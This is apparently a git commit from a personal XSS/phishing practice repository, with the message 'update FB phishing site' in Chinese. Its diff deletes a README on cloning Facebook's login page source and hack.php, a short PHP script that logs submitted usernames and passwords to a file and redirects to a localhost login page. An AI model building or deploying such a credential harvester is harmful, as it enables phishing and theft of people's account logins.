a448b68d508e798f6ad9b0f0b3403b3456b1179f
unknown <zz860926@gmail.com>
2019-11-27 21:47:41 +0800

    update FB釣魚網站

--- XSS攻擊/facebookhack/README.md
+++
@@ -1,6 +0,0 @@
-# Facebook釣魚架設      
-      
-先在Facebook頁面按右鍵"檢視原始碼"
-![](image/a.png)
-把原始碼都複製下來
-![](image/b.png)
--- XSS攻擊/hackpasswd/hackersite/hack.php
+++
@@ -1,8 +0,0 @@
-<?php 
-$login = $_REQUEST["account"];
-$pass = $_REQUEST["passwd"];
-$data = fopen("logfile.txt","a+");
-fwrite($data, "Username: $login\nPassword: $pass\n");
-fclose($data);
-Header("location: http://localhost/XSS-Projects-master/hackerproof/login.php?account=$login&passwd=$pass")
-?>
